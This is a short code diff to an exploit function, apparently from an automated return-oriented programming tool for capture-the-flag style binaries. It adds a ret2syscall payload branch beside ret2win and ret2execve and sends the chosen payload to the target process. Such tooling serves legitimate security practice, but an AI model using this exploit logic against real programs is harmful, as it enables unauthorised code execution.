@@ -102,7 +102,9 @@ def exploit(analyize, properties):
     if properties["win"]:
         payload = rop.ret2win()
     elif properties["execve"]:
-        payload = rop.ret2execve()    
+        payload = rop.ret2execve()
+    elif properties["syscall"]:
+        payload = rop.ret2syscall()
 
     if payload:
         p.sendline(payload)
